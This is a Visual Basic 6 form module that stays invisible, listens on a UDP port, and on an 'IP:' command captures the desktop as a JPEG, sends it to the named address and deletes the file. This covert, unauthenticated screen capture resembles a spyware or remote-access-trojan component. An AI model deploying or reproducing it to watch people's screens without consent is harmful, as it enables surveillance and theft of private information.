VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form FSendDesktop 
   ClientHeight    =   2340
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   8100
   LinkTopic       =   "Form1"
   ScaleHeight     =   2340
   ScaleWidth      =   8100
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
      RemotePort      =   7000
      LocalPort       =   7001
   End
End
Attribute VB_Name = "FSendDesktop"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function getDesktop Lib "GetDesktopBitmap.dll" (ByVal nWidth As Integer, ByVal nHeight As Integer, blnJpeg As Boolean, ByVal JPGCompressQuality As Integer, ByVal strFileName As String) As Integer
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Dim ReceiveData As String
Dim FileName As String
Dim Buffer As String

Private Sub Form_Load()
    Winsock1.Bind Winsock1.LocalPort
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
FileName = "Desk.jpg"
    Winsock1.GetData ReceiveData
    If Left(ReceiveData, 3) = "IP:" Then
        Winsock1.RemoteHost = Right(ReceiveData, Len(ReceiveData) - 3)
        getDesktop 0, 600, True, 60, App.Path & "\" & FileName
        SendFile App.Path, FileName
        Kill (App.Path & "\" & FileName)
    End If
End Sub


Private Function SendFile(strFilePath As String, strFileName As String)
Dim intFilenum As Integer

On Error Resume Next
If Left(strFilePath, 1) <> "\" Then strFilePath = strFilePath & "\"
If Dir(strFilePath & strFileName) = strFileName Then
    intFilenum = FreeFile
    Open strFilePath & strFileName For Binary Access Read As #intFilenum
    Winsock1.SendData "OpenFile" + strFileName
    If LOF(intFilenum) <= 2044 Then
        Buffer = Space(LOF(intFilenum))
        Get #intFilenum, , Buffer
        Winsock1.SendData "같같" + Buffer
    Else
        For SendChunk = 1 To Int(LOF(intFilenum) / 2044)
            Buffer = Space(2044)
            Get #intFilenum, , Buffer
            Winsock1.SendData "같같" + Buffer
            Sleep 200
        Next
        If LOF(intFilenum) Mod 2044 <> 0 Then
            Buffer = Space(LOF(intFilenum) Mod 2044)
            Get #intFilenum, , Buffer
            Winsock1.SendData "같같" + Buffer
        End If
    End If
    Winsock1.SendData "Close"
    Close #intFilenum
End If

End Function

